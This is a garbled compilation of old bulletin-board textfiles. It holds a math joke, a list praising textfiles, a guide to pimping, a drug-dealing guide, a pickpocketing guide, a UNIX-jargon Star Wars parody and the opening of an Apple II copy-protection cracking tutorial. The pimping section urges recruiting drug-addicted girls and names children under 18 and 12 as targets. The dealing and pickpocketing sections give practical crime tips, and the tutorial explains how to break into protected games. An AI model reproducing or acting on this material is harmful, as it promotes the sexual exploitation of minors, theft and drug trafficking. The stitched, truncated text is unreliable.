truncated in several places But it was to late to differentiate now. As the months went by, Polly's denominator increased monotonically. Finally she went to L'Hopital and generated a small but pathological function which left surds all over the place and drove Polly to deviation.       The moral of our sad story is this   If you want to keep your expressions convergent, never allow them a single degree of freedom.

Being the owner of one of the largest Textfile Clearinghouses in the US, I've been asked a few times why I prefer textfiles over anything else for computers. So, I decided to put my reasons into a textfile  Wraparound city  and exaplin to you my reasons        Textfiles won't erase yer Hard Drive, then print  HeyHey EATME!       Textfiles don't require a joystick.      Textfiles don't make you rely on your hand eye coordination at 3 00am.      Textfiles never have to worry about compatibility, or DOS versions.      Textfiles don't feature little green things on the screen named  Glorks .      Textfiles don't become  Old Warez  in 3 days.      You can change one byte in a textfile, and the computer won't crash.      Textfiles don't take up a whole disk every time.      Textfiles don't require 4 color advertising in COMPUTE!      Textfiles don't need programs, but most programs need textfiles.      Textfiles can be drastically changed in a matter of minutes.      Textfiles won't watch you log on, and copy your password to a secret file.      Textfiles are cheap, or free.      Textfiles won't do anything if you're not there.      Textfiles don't need to be compiled.      Textfiles don't can run at any speed you want.      You can tell how good or bad a textfile is, AS you're downloading.      Textfiles don't make sounds in the middle of the night, while your parents     are sleeping in the next room.      If you take your eyes away from a textfile, it won't go  GAME OVER .      Textfiles don't bring out hidden surprises.      You can bring textfiles to school, and the teacher won't accuse you of     being a pirate.  Usually. My old Computer Teacher took away some Blue Box     plans I was printing on the school computer. Fuck him.       You can read textfiles during a blackout, with a flashlight.      You won't be accused of being a nerd if you have textfiles in your school     notebook  Unless you're Scott B.  Heh        Everyone can use a textfile on the first try.   "

You must have understanding parents that will let you leave the house on weekdays during late hours but not later than 12 at night.  Drug dealers  they are a big help in recruting the girls. Girls that need some money to pay for their drug habbits are easy targets.  They will do anyhing to keep the supply of whatever that they are hooked on continuing.   All children under the age of 18 and even 12 ar good targets to take advantage of if they have drug habbits.   Tell your local pusher that when he sells his goods that he should refer any young and fairly good looking girls to you for some extra cash.   They will jump at the offer.  employer.  DO NOT TAE FREE SAMPLES!!  The girls will only feel intimidated. You what he thought.  Could the girl do better  Will she improve with practice  Did she resest only in the beginning, or also later  What is your total over all feeling of her  Can you spread the word around about my services   Thank You...  See you again!   Once that you have a clientell set up and a good list of girls, have a  Data Base like Apple Works keep track of appointments and other things.  If you  decide to continue with the bussiness, invest in Real Estate. That will also  pay off in the end!  Open up a descrete Whore House.   This is NO joking matter, this is the exact thing that you should do.   If you decide that drug pushing is a better money maker, then do it, but  whatever you do, don't do what you sell.  It is allways better that you do not  sample what you sell!!!  Allways remember this!  That was the down fall of some  friends that I knew that had a few bussiness like that of which we are refering  to.   The final thing that you should do, to keep your investment going, is to  allways have the girls checked up weekly.  You do not want any deseases going  around.  That may hurt you reputation.   Keep it clean, don't sample what you sell, and be curtios to the customer. If  you follow what I have told you, you will be able to relax in luxury in just a  year or less and afford anything that you want.  This is what we call capitol  gain, something like Monopoly...

To start it off, you must find your way to being a dealer through other dealers. You have to get contacts and find out where your local dealer is getting his stash from.  I am not an expert on this subject but once you get the connections all you have to do is be carefull of gready dealers that do not want to share customers with you.  The best place to pass off a few drugs the you have been stocking up on, is the good ole' PARTY!!!  This is the best place that you can sell all kinds of things to everyone.  Don't be afraid of the cops in just the average friday night party, they are only there when  they make themselves noticable.  When you see a few cop cars drive up to the  house or whatever, get rid of your stash if the situation looks real bad. Don't worry about loosing a few bucks.  It is much better to loose a little illegal money than it is to get cought with it and the dope. If the party gets raided, and they usually do, get the hell out of there via the back door leading into the backyard.  You must not run right to the cops who are o in the front of the place.  Get going to the neighbor's yard and keep going.   The party is a very good place to make a few bucks when you have gotten a supplyer.  Remember what I said about the first file...  Don't do what you sell, it will only get you fucked up.

I think that I will start to write a book on the subject.       The best place to find victims are in incredibally crouded places someplace like a concert or a movie the theater, someplace that is dark or something.  I have found that the movies during everyone is leaving and bumping against everybody.  I also like the Factory of Nightmares, a holloween festival.  The only good concerts to hit are New Wave, Pop or Jazz concerts because you don't want to fuck with a bug ass punker that has 20 friends that can beat the shit out of you.       Once you have found a target  victim , approach him or her. Wallets are easy prey and in my opinion, are much easier to get.  Besides, the male usually carries more cash with him. Don't go for purses unless you have some sissors to cut the strap connected to the purse  this makes it much easier.   Well, if your victim is male and carries a wallet, push him away from you while you are holding on to his wallet.  Kinda fake that you bumped into him on accident  well, you know. This way, he moved and his wallet didn't, it will still be in your grimy little hands.  HA HA....  He won't even feel it.  If you are just begining, quickly drop the wallet on the floor, and put your foot over it.  If the man turns around, just say if he asks about it,  Ohhh, looky there... Is this your wallet that just feel out of ya pocket  WOW what do you know!!   You will be off the hook.

User programs, striking from a hidden directory, have won their first victory against the evil Administrative Empire.  During the battle, User spies managed to steal secret source code to the Empire's ultimate program  the Are Em Star, a priviledged root program with enough power to destroy an entire file structure. Pursued by the Empire's sinister audit trail, Princess _LPA0 races   aboard her shell script, custodian of the stolen listings that could save her people, and restore freedom and games to the network...                                                                             THE CONTINUING SAGA OF THE ADVENTURES OF LUKE VAXHACKER  As we enter the scene, an Imperial Multiplexer is trying to kill a consulate ship.  Many of their signals have gotten through, and RS232 decides it's time to fork off a new process before this old ship is destroyed.  His companion, 3CPU, is following him only because he appears to know where he's going...   I'm going to regret this!  cried 3CPU, as he followed RS232 into the buffer.  RS232 closed the pipes, made the sys call, and their process detached itself from the burning shell of the ship.  The commander of the Imperial Multiplexer was quite pleased with the attack.  Another process just forked, sir. Instructions   asked the lieutenant.   Hold your fire.  That last power failure must have caused a trap thorough zero.  It's not using any cpu time, so don't waste a signal on it.    We can't seem to find the data file anywhere, Lord Vadic.    What about that forked process   It could have been holding the channel open, and just pausing.  If any links exist, I want them removed or made inaccessable.  Ncheck the entire file system 'til it's found, and nice it  20 if you have to.   Meanwhile, in our wandering process...  Are you sure you can ptrace this thing without causing a core dump   queried 3CPU to RS232.  This thing's been striped, and I'm in no mood to try and debug it.   The lone process finishes execution, only to find our friends dumped on a lonely file system, with the setuid inode stored safely in RS232.  Not knowing what else to do, they wandered around until the jawas grabbed them.  Enter our hero, Luke Vaxhacker, who is out to get some replacement parts for his uncle. The jawas wanted to sell him 3CPU, but 3CPU didn't know how to talk directly to an 11 40 with RSTS, so Luke would still needed some sort of interface for 3CPU to connect to.   How about this little RS232 unit    asked 3CPU.  I've delt with him many times before, and he does an excellent job at keeping his bits straight.   Luke was pressed for time, so he took 3CPU's advice, and the three left before they could get swapped out.  However, RS232 is not the type to stay put once you remove the retaining screws.  He promptly scurried off into the the deserted disk space.   Great!  cried Luke,  Now I've got this little tin box with the only link to that file off floating in the free disk space.  Well, 3CPU, we better go find him before he gets allocated by someone else.  The two set off, and finaly traced RS232 to the home of PDP 1 Kenobi, who was busily trying to run an icheck on the little RS unit.   Is this thing yours   His indirect address are all goofed up, and the size is gargatious.  Leave things like this on the loose, and you'll wind up with dups everywhere.  However, I think I've got him fixed up.  It seems that he's has a link to a data file on the Are Em Star.  This could help the rebel cause.   I don't care about that,  said Luke.  I'm just trying to optimize my uncle's scheduler.    Oh, forget about that.  Dec Vadic, who is responsible for your fathers death, has probably already destroyed his farm in search of this little RS232.  It's time for you to leave this place, join the rebel cause, and become a UNIX wizard! I know a guy by the name of Con Solo, who'll fly us to the rebel base at a price.                                                                             Later that evening, after futile attempts to interface RS232 to Kenobi's Asteroids cartridge, Luke accidentally crossed the small 'droid's CXR and Initiate Remote Test  must have been all that Coke he'd consumed , and the screen showed a very distressed person claiming royal lineage making a plea for help from some General OS 1 Kenobi.   Darn,  mumbled Luke.   I'll never get this Asteroids game worked out.   PDP 1 seemed to think there was some significance to the message and a possible threat to Luke's home directory.  If the Administrative Empire was indeed tracing this 'droid, it was likely they would more than charge for cpu time...   We must get that 'droid off this file system,  he said after some intervals. They sped off to warn Luke's kin  taking a `relative' path  only to find a vacant directory...   As you remember, Luke and the droids have joined PDP 1 to find Con Solo...  Luke, PDP 1 and the droids piled into Lukes vehicle  a floating point model . They raced across the disc until, off in the distance, Luke saw smoke rising from the spindle.    Uh oh, looks like a bearing failure.   exclaimed Luke.   Better call the service engineer.     Don't bother,  sighed PDP 1,  it's a head crash.    As they approached the scene, the total devastation became apparent. TTY fighters had strafed the surface, scraping off the oxide right down to the aluminum.  After cooking the raw data, the External Storm Flunkies landed and finished the job by disassembling all the code that was still executing. There was nothing left alive at Lukes home.    I want to become a Red eye Night and cream the dastardly villains who did this.   Luke resolved  shades of Snidely Wiplash .   The comrades set out west, or was it east, no...perhaps it was south  southeast  it's hard to keep track of directions when you are spinning at 3600 RPM .  After traveling many sectors, the party finally arrived at the city of Bellabs.    This place is filled with microprocessors.  said PDP 1.   Every eight bit hood is trying to make a word, so watch what you say.     Halt!   demanded the Flunkie.   What is your business, eh      I am a trader of pipes and filters.  replied PDP 1.    Have you seen two hackers with two droids in your travels, eh   ques  tioned the Flunkie.    No, I travel alone and have seen no one.   said PDP 1.    OK, you may proceed, eh.   ordered the Flunkie.   Off drove our heros, a look of puzzlement upon Lukes face.   Why did the Flunkie let us go      A small demonstration of ...     The Source ...!   PDP 1 responded.   He only saw me because I encrypted you and the droids. Storm Flunkies have simple instruction sets and are not known for their ability to break codes.    They drove to a bar that Con Solo was known to frequent.  As they entered, Luke was amazed to see the seedier side of Bellabs.  There was an 8080 with a TRS 80. A couple of 6800's talking to a 6502. A Z80 was vying for the 8080's date.  In the corner sulked a 4004, eating data...nibble by nibble.    We don't allow no droids in here.   rasped the  tender.   As 3CPU turned to leave, he said  We will wait for you outside.    RS232, being ambidextrous, backspaced out the door.                   At this point  . , the author forgets the details of the true story  remember, this is only fiction, but it is based upon a true story as told to us by Uncle George of Lucasland, somewhere near San Rafael . Stay tuned for the next adventure when Con Solo is heard to exclaim     Lite beer!!   I sink a 100 foot well, for a friend, and all you serve is lite beer      This is core's lite.  said the  tender.    RAM it!   demanded Con.                                                                            After sifting through the overwritten remaining blocks of Luke's home directory, Luke and PDP 1 sped away from  u lars, across the surface of the Winchester riding Luke's flying read write head.  PDP 1 had Luke stop at the edge of the cylinder overlooking  usr spool uucp.   Unix to Unix Copy Program   said PDP 1.   You will never find a more wretched hive of bugs and flamers.  We must be cautious.   As our heroes' process entered  usr spool news, it was met by a newsgroup of Imperial protection bits.   State your UID.  commanded their parent process.   We're running under  usr guest.  This is our first time on this system,  said Luke.   Can I see some temporary priviledges, please     Uh...    This is not the process you are looking for,  piped in PDP 1, using an obscure bug to momentarily set his effective UID to root.   We can go about our business.    This isn't the process we want.  You are free to go about your business.  MOV along!   PDP 1 and Luke made their way through a long and tortuous nodelist  cwruecmp!decvax!ucbvax!harpo!ihnss!ihnsc!ihnss!ihps3!stolaf!borman  to a dangerous netnode frequented by hackers, and seldom polled by Imperial Multiplexers.  As Luke stepped up to the bus, PDP 1 went in search of a likely file descriptor.  Luke had never seen such a collection of weird and exotic device drivers.  Long ones, short ones, ones with stacks, EBCDIC converters, and direct binary interfaces all were drinking data at the bus.                          transmitted a particularly unstructured piece of code.   He doesn't like you,  decoded his coroutine.   Sorry,  replied Luke, beginning to backup his partitions.   I don't like you either.  I am queued for deletion on 12 systems.    I'll be careful.    You'll be reallocated!  concatenated the coroutine.   This little routine isn't worth the overhead,  said PDP 1 Kenobie, overlaying into Luke's address space.                   AV  gfdfRW   !!!!!!!!!!!!!!!!!  encoded the first coroutine as it attempted to overload PDP 1's input overvoltage protection.  With a unary stroke of his bytesaber, Kenobie unlinked the offensive code.   I think I've found an I O device that might suit us.    The name's Con Solo.  I hear you're looking for some relocation.    Yes indeed, if it's a fast channel.  We must get off this device.    Fast channel  The Milliamp Falcon has made the ARPA gate in less than twelve nodes!  Why, I've even outrun cancelled messages.  It's fast enough for you, old version.   Our heroes, Luke Vaxhacker and PDP 1 Kenobie made their way to the temporary file structure.  When he saw the hardware, Luke exclaimed,  What a piece of junk! That's just a paper tape reader!                                                                             Luke had grown up on an out of the way terminal cluster whose natives spoke only BASIC, but even he could recognize an old ASR 33.   It needs an EIA conversion at least,  sniffed 3CPU, who was  as usual  trying to do several things at once.  Lights flashed in Con Solo's eyes as he whirled to face the parallel processor.   I've added a few jumpers.  The Milliamp Falcon can run current loops around any Imperial TTY fighter.  She's fast enough for you.    Who's your co pilot   asked PDP 1 Kenobie.   Two Bacco, here, my Bookie.    Odds aren't good,  said the brownish lump beside him, and then fell silent, or over.  Luke couldn't tell which way was top underneath all those leaves.  Suddenly, RS232 started spacing wildly.  They turned just in time to see a write cycle coming down the UNIBUS toward them.   Imperial Bus Signals!  shouted Con Solo.   Let's boot this popsicle stand!  Tooie, set clock fast!    Ok, Con,  said Luke.   You said this crate was fast enough.  Get us out of here!    Shut up, kid!  Two Bacco,  prepare to make the jump into system space! I'll try to keep their buffers full.   As the bookie began to compute the vectors into low core, spurious characters appeared around the Milliamp Falcon.   They're firing!  shouted Luke.  Can't you do something     Making the jump to system space takes time, kid.  One missed cycle and you could come down right in the middle of a pack of stack frames!    Three to five we can go now,  said the bookie.  Bright chunks of position independent code flashed by the cockpit as the Milliamp Falcon jumped through the kernel page tables.  As the crew breathed a sigh of relief, the bookie started paying off bets.   Not bad, for an acoustically coupled network,  remarked 3CPU.   Though there was a little phase jitter as we changed parity.                                                                              The story thus far   Luke, PDP 1 and their 'droids RS232 and 3CPU have made good their escape from the Imperial Bus Signals with the aid of Con Solo and the bookie, Two Bacco.  The Milliamp Falcon hurtles onward through system space.  Meanwhile, on a distant page in user space...  Princess _LPA0  was ushered into the conference room, followed closely by Dec Vadic.   Governor Tarchive,  she spat,  I should have expected to find you holding Vadics lead.  I recognized your unique pattern when I was first brought aboard.   She eyed the 0177545 tatooed on his header coldly.   Charming to the last,  Tarchive declared menacingly.   Vadic, have you retrieved any information     Her resistance to the logic probe is considerable,  Vadic rasped.  Perhaps we would get faster results if we increased the supply voltage...    You've had your chance, Vadic.  Now I would like the princess to witness the test that will make this workstation fully operational.  Today we enable the  r beam option, and we've chosen the princess'  HOME of  usr alderaan as the primary target.    No!  You can't!   usr alderaan is a public account, with no restricted permissions.  We have no backup tapes!  You can't...    Then name the rebel inode!  Tarchive snapped.  A voice announced over a hidden speaker that they had arrived in  usr.   1248,  she whispered,  They're on  dev rm3.  Inode 1248.   She turned away.  Tarchive sighed with satisfaction.   There, you see, Lord Vadic   She can be reasonable.  Proceed with the operation.   It took several clock ticks for the words to penetrate.   What!  _LPA0  gasped.    dev rm3 is not a mounted filesystem,  Tarchive explained.   We require a more visible subject to demonstrate the power of the RM STAR workstation.  We will mount an attack on  mnt dantooine as soon as possible.   As the princess watched, Tarchive reached over and typed  ls  on a nearby terminal.  There was a brief pause, there being only one processor on board, and the viewscreen showed,  .  not found.   The princess suddenly double  spaced and went off line.                                                                            The Milliamp Falcon hurtles on through system space...  Con Solo finished checking the various control and status registers, finally convinced himself that they had lost the Bus Signals as they passed the terminator.  As he returned from the I O page, he smelled smoke. Solo wasn't concerned  the Bookie always got a little hot under the collar when he was losing at chess.  In fact, RS232 had just executed a particularly clever MOV that had blocked the Bookie's data paths.  The Bookie, who had been setting the odds on the game, was caught holding all the cards.  A little strange for a chess game...  Across the room, Luke was too busy practicing bit slice technique to notice the commotion.   On a word boundary, Luke,  said PDP 1.  Don't just hack at it.  Remember, the Bytesaber is the weapon of the Red eye Night.  It is used to trim offensive lines of code.  Excess handwaving won't get you anywhere.  Listen for the Carrier.   Luke turned back to the drone, which was humming quietly in the air next to him.  This time Luke's actions complemented the drone's attacks perfectly.  Con Solo, being an unimaginative hacker, was not impressed.   Forget this bit slicing stuff.  Give me a good ROM blaster any day.      j  hhji  ,  said Kenobie, with no clear inflection.  He fell silent for a few seconds, and reasserted his control.   What happened   asked Luke.   Strange,  said PDP 1.   I felt a momentary glitch in the Carrier.  It's equalized now.    We're coming up on user space,  called Solo from the CSR.  As they cruised safely through stack frames, the emerged in the new context only to be bombarded by freeblocks.   What the...  gasped Solo.  The screen showed clearly     usr alderaan  not found  It's the right inode, but it's been cleared!  Twoie, where's the nearest file     3 to 5 there's one...  the Bookie started to say, but was interrupted by a bright flash off to the left.   Imperial TTY fighters!  shouted Solo.   A whole DZ of them!  Where are they coming from     Can't be far from the host system,  said Kenobie.   They all have direct EIA connections.   As Solo began to give chase, the ship lurched suddenly.  Luke noticed the link count was at 3 and climbing rapidly.   This is no regular file,  murmured Kenobie.   Look at the ODS directory structure ahead!  They seem to have us in a tractor beam.    There's no way we'll unlink in time,  said Solo.   We're going in.                                                                              When we last left Luke, the Milliamp Falcon was being pulled down to the open collector of the Imperial Arem Star Workstation.  Dec Vadic surveys the relic as Imperial Flunkies search for passengers...   LS scan shows no one aboard, sir,  was the report.  Vadic was unconvinced.   Send a fully equipped Ncheck squad on board,  he said.   I want every inode checked out.   He turned around  secondary channel  and stalked off.  On board the Milliamp Falcon, .Luke was puzzled.   They just walked in, looked around and walked off,  he said.   Why didn't they see us    .Con smiled.   An old munchkin trick,  he explained.   See that period in front of your name    .Luke spun around, just in time to see the decimal point.   Where'd that come from   he asked.   Spare decimal points lying around from the last time I fixed the floating point accelerator,  said .Con.   Handy for smuggling blocks accross file system boundaries, but I never thought I'd have to use them on myself. They aren't going to be fooled for long, though.  We'd better figure a way outa here.                                                At this point  .  the dialogue tends to wedge.  Being the editor and in    total control of the situation, I think it would be best if we sort of    gronk the next few paragraphs.  For those who care, our heroes find    themselves in a terminal room of the Workstation, having thrashed several    Flunkies to get there.  For the rest of you, just keep banging the    rocks together, guys.   Ed.                                                 Hold on,  said Con.   It says we have `new mail.'  Is that an error      SYS W NORMAL, Normal, successful completion,  said PDP 1.   Doesn't look like it.  I've found the inode for the Milliamp Falcon.  It's locked in kernel data space.  I'll have to slip in and patch the reference count, alone.   He disappeared through a nearby entry point.  Meanwhile, RS232 found a serial port and logged in.  His bell started ringing loudly.   He keeps saying, `She's on line, she's on line',  said 3CPU.   I believe he means Princess LPA0 .  She's being held on one of the privileged levels.                                                Once again, things get sticky, and the dialogue suffers the most damage.    After much handwaving and general flaming, they agree to rescue her.    They headed for the detention level, posing as Flunkies  which is hard    for most hackers  claiming that they had trapped the Bookie executing    an illegal racket.  They reached the block where the Princess was locked    up and found only two guards in the header.   Ed.                                                Good day, eh   said the first guard.   How's it goin', eh   said the other.   Like, what's that, eh     Process transfer from block 1138, dev 10 9,  said Con.   Take off, it is not,  said the first guard.   Nobody told US about it, and we're not morons, eh    At this point  . , the Bookie started raving wildly, Con shouted  Look out, he's loose!  and they all started blasting ROMs left and right.  The guards started to catch on and were about to issue a general wakeup when the ROM blasters were turned on them.   Quickly, now,  said Con.   What buffer is she in   It's not going to take long for these...   The intercom receiver interrupted him, so he took out its firmware with a short blast.   guys to figure out something is goin' on,  he continued.                                                                                Ok, like, remember we left our heroes in the detention priority level   Well, they're still there...   Luke quickly located the interface card and followed the cables to a sound  proof enclosure.  He lifted the lid and peered at the mechanism inside.   Aren't you a little slow for ECL   printed princess LPA0 .   Wha   Oh, the Docksiders,  stammered Luke.  He took off his shoes  for industry  and explained,  I've come relocate you.  I'm Luke Vaxhacker.   Suddenly, forms started bursting around them.   They've blocked the queue!  shouted Solo.   There's only one return from this stack!    OVER HERE!  printed LPA0  with overstrikes.   THROUGH THIS LOOPHOLE!  Luke and the princess disappeared into a nearby feature.   Gritch, gritch,  mumbled Two Bacco, obviously reluctant to trust an Administrative oversight.   I don't care how crufty it is!  shouted Con, pushing the Bookie toward the crock.   DPB yourself in there now!   With one last blast that reprogrammed two flunkies, Con joined them. The  feature  landed them right in the middle of the garbage collection data.  Pieces of code that hadn't been used in weeks floated past in a pool of decaying bits.   Bletch!  was Con's first comment.   Bletch, bletch,  was his second. The Bookie looked as if he'd just paid a long shot, and the odds in this situation weren't much better.  Luke was polling the garbage when he stumbled upon a book with the words  Don't Panic  inscribed in large, friendly letters on the cover.   This can't possibly help us now,  he said as he tossed the book away.  The Bookie was about to lay odds on it when Luke suddenly disappeared. He popped up accross the pool, shouting,  This is no feature! It's a bug!  and promptly vanished again.  Con and the princess were about to panic   when Luke reappeared.   What happened   they asked in parallel.   I don't know,  gasped Luke.   The bug just dissolved automagically. Maybe it hit a breakpoint...    I don't think so,  said Con.   Look how the pool is shrinking.  I've got a bad feeling about this...   The princess was the first to realize what was going on.   They've implemented a new compaction algorithm!  she exclaimed.  Luke remembered the pipe he had open to 3CPU.   Shut down garbage collection below recursion level 5!  he shouted.  Back in the control room, RS232 searched the process table for the lisp interpreter.   Hurry,  sent 3CPU.   Hurry, hurry,  added his other two processors.  RS232 found the interpreter, interrupted it, and altered the stack frame they'd fallen into to allow a normal return.                                                                                Join us next time when we hear the bowl of petunias say,  Oh, no, not again.                                                                                 Luke noticed an unused handler lying around and jumped to it.  The others followed and were soon able to execute an escape sequence.                                                                                 Meanwhile, PDP 1 made his way deep into the core of the Workstation, slipping from context to context, undetected through his manipulation of label_t.  Finally, causing a random trap  through nofault of his own  he arrived at the inode table.  Activity there was always high, but the Spl6 sentries were too secure in their knowledge that no user could interrupt them to notice the bug that PDP 1 carefully introduced.  On a passing iput, he adjusted the device and inode numbers, maintaining parity, to free the Milliamp Falcon.  They would be long gone before the locked inode was diagnosed...  Unobserved, he began traversing user structures to find the process where the Milliamp Falcon was grounded.  Finding it and switching context, he discovered his priority weakened suddenly.   That's not very nice,  was all he could say before the cause of the obstruction became clear.   I have been pausing a long time, PDP 1 Kenobi,  rasped Dec Vadic.   We meet again at last.  The circuit has been completed.   They looped several times, locking byte sabers.  Bit by bit, PDP 1 appeared to weaken.  The fight had come into the address space of the Milliamp Falcon, and provided the .di  diversion   that allowed Luke and the others to reassert control.  Luke paused to watch the conflict.   If my blade finds its mark,  warned Kenobi,  you will be reduced to so many bits.  But if you slice me down, I will only gain computing power.    Your documentation no longer confuses me, old version,  growled Vadic.  my Role MASTER now.    At last, we'll see who the real file master is!  he remarked. Bits, bytes, words,and nybbles flew as the two fought for bus mastership.  PDP 1 exclaimed  You were my best subtask! How could you have been seduced by the sideband portion of the carrier  .   It's simple,  Vadic said,  I enjoy obscure protocol .  While the battle continued, Luke, Con, Bookie, and the Princess linked up with the droids and found their way back to the inode where the Milliamp Falcon was stored.  It looked quiet, but, Luke said  It could be an MMU trap!   No chance!  said Con,  I loaded the par's before I left the Falcon.   As they started toward it a squad of recursive functions swapped in and started firing ROM blasters at them.  I thought you said it couldn't be a trap  quipped Luke  I said no chance for an MMU trap this is obviously a k mon  f trap to 4  Con replied.  PDP 1 shouted at the others  Escape while you can! I'll cause wait states as long as possible!  and with that he allowed Vadic a chance to apply several hits with the bytesaber.  Instead of halting PDP 1 was encoded onto the carrier.   With one stroke, Vadic sliced Kenobi's last word.  Unfortunately, the word was still in Kenobi's throat.  The word fell clean in two, but Kenobi was nowhere to be found.  Vadic noticed his victim's uid go negative, just before he disappeared.  Odd, he thought, since uids were unsigned...  Luke witnessed all this, and had to be dragged into the Milliamp Falcon. Con Solo and Two Bacco maneuvered the Milliamp Falcon out of the process, onto the bus and made straight for system space.  3CPU and RS232 were idle, for once.  Princess _LPA0  tried to print comforting things for him, but Luke was still hung from the loss of his friend.  Then, seemingly from nowhere, he thought he heard PDP 1's voice say,      May the carrier be with you.                                                                                  The Milliamp Falcon was restarted and managed to escape the shell.  Quickly!  shouted Con,  We've got to warp into virtual space!  The Bookie made several attempts, but it was obvious that a CE had not done PM in a long time and it would take a lot of decimal adjusts to byte align all the data registers.  After much debugging, virtual space was finally achieved.   Do you know the path   asked Princess LPA0.  No sweat , said Con,  All we have to do is check the free space map .                                                                                 rest of star wars, especially the dog fight     begining of empire strikes back, especially the battle ...                                                                                 Some months later...  Luke was feeling rather bored.  3CPU could get to be rather irritating and RS232 didn't really speak Luke's language.  Suddenly, Luke felt someone's eyes boring through the back of his skull.  He turned slowly to see...nothing.  A quiet voice came from somewhere in front of him.   Grasshopper, the carrier is strong within you.   Luke froze, which was a good thing since his legs were insisting that he run but they weren't likely to be particular about direction.  Luke guessed that his odds of getting lost in the dense tree structures were pretty good.  Unfortunately, the Bookie wasn't available.   Yes. Very strong, but the modulation is yet weak. His network interface is totally undeveloped,  the voice continued.  A small furry creature walked out of the woods as Luke stared on.  Luke's stomach had now joined the rest of his body in loud complaints.  Whatever was peering at him was certainly small and furry, but Luke was quite sure that it didn't come from Alpha Centauri.   Well, well,  said the creature as it rolled its eyes at Luke.   Frobozz, y'know.  Morning, name's modem.  What's your game   Adventure   D D  Or are you just one of those Apple pong types that hang around the store demonstrations    Luke closed his eyes.  Perhaps if he couldn't see it, it wouldn't notice him.   H'mm,  muttered the creature.   Must use a different protocol.     H            H             G         G' o          H b      No, no,  stammered Luke.   I don't speak EBCDIC.  I was sent here to become a UNIX wizard.  Must have the wrong address.    Right address,  said the creature.   I'm a UNIX wizard.  Device drivers a specialty.  Or do you prefer playing with virtual memory    Luke eyed the creature cautiously.  If this was what happened to system wizards after years of late night crashes, Luke wasn't sure he wanted anything to do with it.  He felt a strange affection for the familiar microcomputers of his home.  And wasn't virtual memory something that you got from drinking too much Coke                                                                   rest of empire strikes back, especially getting to the user haven, a    directory unconnected to  .

THIS SERIES, WHILE AIMED AT THE BEGINNING TO INTERMEDIATE KRACKIST, WILL STILL ASSUME A REASONABLE KNOWLEDGE OF ASSEMBLY LANGUAGE.  IF YOU FIND THESE DISCUSSIONS ARE STILL TOO HEAVY INTO MACHINE CODE FOR YOU, THEN IT'S BEST TO BUY A BOOK LIKE ROGER WAGNER'S  ASSEMBLY LINES  OR EQUIVALENT, AND STUDY IT CAREFULLY  IF, ON THE OTHER HAND, YOU FIND THAT THIS IS ALL BENEATH YOU, JUST KEEP A KNOWING SMIRK ON YOUR LIPS AS YOU SKIP LIGHTLY OVER THESE EPISODES   THERE MIGHT BE SOMETHING YOU MISSED BECAUSE YOU HAD A BAD HANGOVER ONE DAY IN KRACKING 101 .    IN THIS AND FUTURE EPISODES IN THE 'BASICS OF KRACKING' SERIES, WE'LL DEAL WITH THE FUNDAMENTALS OF THE KRACKIST'S ART, STARTING WITH THE HOW  AND WHY  OF MAKING ALTERATIONS IN THE APPLE'S  PERMANENT  MEMORY.  FIRST OF ALL, THE MOST IMPORTANT SINGLE TOOL AVAILABLE TO THE ASPIRING KRACKIST IS REPLACING THE AUTOSTART ROM ON THE MOTHER BOARD WITH AN  OLD MONITOR  ROM.  WITH THIS ROM IN PLACE, YOU CAN HIT 'RESET' WHENEVER YOU WANT, AND ALWAYS BE RETURNED TO THE MONITOR FOR THE BEGINNING OF THE SNOOPING PROCESS.  THIS CHANGE, INCIDENTALLY, WILL MAKE AVAILABLE TO YOU A REASONABLE SET OF  STEP AND TRACE  UTILITIES  SEE THE APPLE II REFERENCE MANUAL. PP 51 53 .    TO UNDERSTAND WHAT THE DIFFERENCES ARE BETWEEN THE TWO ROMS, LET'S TAKE A MINUTE TO EXAMINE WHAT PRESSING THE 'RESET' KEY DOES  OMIGOSH, MAUDE, THERE HE GOES AGAIN ON THAT DETAILED TECHNICAL CRAP! .  INSTEAD OF GOING THROUGH THE KEYBOARD INPUT ROUTINE AT C000, THE RESET KEY IS CONNECTED DIRECTLY TO PIN 40 OF THE 6502 MICROPROCESSOR CHIP.  WHEN THIS PIN IS CONNECTED TO GROUND  0 VOLTS , THE COMPUTER JUMPS UNCONDITIONALLY TO THE ADDRESS CONTAINED IN LOCATIONS FFFC AND FFFD.  THIS IS NOT A TRUE INTERRUPT, SINCE THE APPLE FORGETS WHAT IT WAS DOING BEFORE THE LINE WAS  YANKED , BUT IT IS AN EXAMPLE OF 'VECTORING' OR SENDING THE COMPUTER TO A SPECIFIC PLACE BY SETTING AN ADDRESS INTO THE PROGRAM COUNTER.  IN THE AUTOSTART ROM, THESE TWO LOCATIONS CONTAIN 62 FA, SO THE NEXT INSTRUCTION TO BE EXECUTED IS AT FA62. THIS SERIES OF ROUTINES  SEE P.  143 AND PP.  36 38 OF THE REFERENCE MANUAL  CHECKS TO SEE IF THE COMPUTER IS BEING POWERED UP FOR THE FIRST TIME  COLDSTART  OR RESET WITH THE POWER ON  WARMSTART .  IF IT IS A WARMSTART, THE SYSTEM JUMPS TO THE INSTRUCTIONS AT LOCATIONS 3F2 AND 3F3, AND BEGINS RUNNING THE PROGRAM FOUND THERE  USUALLY BASIC AT E000 .    THE  OLD MONITOR  ROM, HOWEVER, HAS 59 FF STORED IN FFFC D.  THIS CAUSES AN APPLE II  OR A II  WITH AN INTEGER CARD AND THE RED SWITCH  UP   TO GO TO ROUTINES WHICH SET UP THE KEYBOARD FOR INPUT, THE TV FOR OUTPUT, AND WIND UP IN THE MONITOR WITH THE ' ' PROMPT DISPLAYED.  IN CONTRAST TO THE AUTOSTART ROM, WHERE ANYONE CAN TELL THE RESET BUTTON WHERE TO GO, THERE IS NO WAY TO PREVENT A RESET FROM GOING TO FF59 AND WINDING UP IN THE MONITOR.  THIS IS OBVIOUSLY ESSENTIAL IF YOU WANT TO BREAK INTO A GAME AND START EXAMINING THE CODE, BUT IT HAS ITS OWN SET OF PROBLEMS.    IN THE PROCESS OF SETTING UP THE I O DESCRIBED ABOVE, ESPECIALLY IN SETTING UP THE TEXT WINDOW ON THE SCREEN, A NUMBER OF LOCATIONS IN ZERO PAGE MUST BE CHANGED.  THE FOLLOWING LOCATIONS WILL PROBABLY BE ALTERED  ALL HEX   20,21,22,23,24,25,28,29,32,33,35, 36,37,38,39, AND 48. WORSE THAN THAT, THE ENTIRE SCREEN SCROLLS UP ONE LINE WHEN THE MONITOR PROMPT IS PRINTED, WHICH LOSES THE ENTIRE TOP ROW OF THE TEXT SCREEN  LOCATIONS 400 427 , AND ALTERS THE CONTENTS OF ALL THE OTHER LOCATIONS FROM 400 7FF, WITH THE EXCEPTION OF THE  SCRATCHPAD  REGIONS AT 478 47F, 4F8 4FF, ETC.   THE COMPUTER WIMP AT 